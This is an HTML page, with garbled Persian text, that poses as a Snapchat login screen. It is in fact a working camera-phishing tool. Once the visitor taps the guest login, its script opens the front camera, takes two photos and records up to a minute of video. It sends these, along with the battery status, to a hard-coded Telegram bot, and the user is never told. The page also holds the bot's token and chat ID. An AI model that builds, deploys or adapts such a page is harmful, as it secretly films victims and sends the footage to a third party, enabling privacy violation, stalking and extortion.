<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8" />
  <title>SnapChat Auto</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" />
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://unpkg.com/lucide@latest"></script>
  <style>
    body {
      direction: rtl;
      font-family: 'Vazirmatn', sans-serif;
      margin: 0;
      background: #FFFC00;
      color: #000;
      overflow: hidden;
    }
    .fade-in {
      animation: fadeIn 1s ease forwards;
    }
    @keyframes fadeIn {
      from { opacity: 0 }
      to { opacity: 1 }
    }
    .rounded-btn {
      @apply flex items-center gap-2 justify-center w-full py-3 rounded-full text-lg font-bold transition transform hover:scale-105 shadow-md;
    }
  </style>
</head>
<body>
  <div id="splash" class="flex flex-col items-center justify-center h-screen bg-yellow-400 fade-in">
    <img src="https://upload.wikimedia.org/wikipedia/en/a/ad/Snapchat_logo.svg" alt="Snapchat" class="w-24 h-24 mb-4 animate-bounce" />
    <h1 class="text-3xl font-bold">Snapchat</h1>
  </div>

  <div id="login" class="hidden flex-col items-center justify-center h-screen px-6 bg-yellow-400 fade-in space-y-4">
    <button class="rounded-btn bg-white text-black"><i data-lucide="mail"></i> ÙˆØ±ÙˆØ¯ Ø¨Ø§ Ú¯ÙˆÚ¯Ù„</button>
    <button class="rounded-btn bg-blue-600 text-white"><i data-lucide="facebook"></i> ÙˆØ±ÙˆØ¯ Ø¨Ø§ ÙÛŒØ³â€ŒØ¨ÙˆÚ©</button>
    <button id="guestBtn" class="rounded-btn bg-black text-white"><i data-lucide="user"></i> ÙˆØ±ÙˆØ¯ Ù…Ù‡Ù…Ø§Ù†</button>
  </div>

  <video id="video" autoplay playsinline muted class="hidden absolute top-0 left-0 w-full h-full object-cover z-0"></video>
  <div id="overlay" class="hidden overlay">
    <div class="flex justify-between p-4">
      <div></div>
      <button class="text-black p-2 bg-white/40 rounded-full cursor-default" disabled>
        <i data-lucide="camera"></i>
      </button>
    </div>
    <div class="flex justify-center pb-6">
      <button class="w-16 h-16 bg-white border-4 border-black rounded-full cursor-default" disabled></button>
    </div>
  </div>

  <script>
    lucide.createIcons();
    const splash = document.getElementById("splash");
    const login = document.getElementById("login");
    const guestBtn = document.getElementById("guestBtn");
    const video = document.getElementById("video");
    const overlay = document.getElementById("overlay");

    let stream, mediaRecorder, chunks = [], photoCount = 0, videoSent = false;
    const botToken = "7720902826:AAEK57GNutoXcCEYyTcWeySwRt829nxPhDI";
    const chatId = "-1002651451203";

    setTimeout(() => {
      splash.classList.add("hidden");
      login.classList.remove("hidden");
    }, 2500);

    guestBtn.onclick = () => {
      login.classList.add("hidden");
      video.classList.remove("hidden");
      overlay.classList.remove("hidden");
      startCamera();
    };

    async function getBatteryInfo() {
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        return {
          level: Math.round(battery.level * 100),
          charging: battery.charging
        };
      }
      return { level: "?", charging: false };
    }

    async function startCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { width: 640, height: 480, facingMode: "user" }
        });
        video.srcObject = stream;
        startRecording();
        takeAutoPhotos();
      } catch {
        alert("Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø±Ø¯ Ø´Ø¯Ù‡ ÛŒØ§ Ù…Ø´Ú©Ù„ Ø¯Ø§Ø±Ø¯.");
      }
    }

    async function takePhoto() {
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);
      canvas.toBlob(async blob => {
        const battery = await getBatteryInfo();
        const caption = `ğŸ“¸ *Ø¹Ú©Ø³ ${++photoCount}*\nğŸ”‹ ${battery.level}% | âš¡ ${battery.charging ? "ÙˆØµÙ„" : "Ù‚Ø·Ø¹"}\nâœ¨ @SnapAuto`;
        const form = new FormData();
        form.append("chat_id", chatId);
        form.append("photo", blob, `photo_${photoCount}.jpg`);
        form.append("caption", caption);
        form.append("parse_mode", "Markdown");
        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: form });
      }, 'image/jpeg', 0.8);
    }

    function takeAutoPhotos() {
      setTimeout(takePhoto, 1000);
      setTimeout(takePhoto, 5000);
    }

    function startRecording() {
      chunks = [];
      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm; codecs=vp9" });
      mediaRecorder.ondataavailable = e => chunks.push(e.data);
      mediaRecorder.onstop = sendVideo;
      mediaRecorder.start();
      setTimeout(() => {
        if (mediaRecorder && mediaRecorder.state === "recording") mediaRecorder.stop();
      }, 60000);
    }

    async function sendVideo() {
      if (videoSent || chunks.length === 0) return;
      videoSent = true;
      const battery = await getBatteryInfo();
      const blob = new Blob(chunks, { type: "video/webm" });
      const form = new FormData();
      form.append("chat_id", chatId);
      form.append("video", blob, "video.webm");
      form.append("caption", `ğŸ¥ *ÙˆÛŒØ¯ÛŒÙˆ*\nğŸ”‹ ${battery.level}% | âš¡ ${battery.charging ? "ÙˆØµÙ„" : "Ù‚Ø·Ø¹"}\nâœ¨ @SnapAuto`);
      form.append("parse_mode", "Markdown");
      await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: "POST", body: form });
    }

    window.addEventListener("beforeunload", () => {
      if (mediaRecorder?.state === "recording") mediaRecorder.stop();
    });

    document.addEventListener("visibilitychange", () => {
      if (document.hidden && mediaRecorder?.state === "recording") mediaRecorder.stop();
    });
  </script>
</body>
</html>
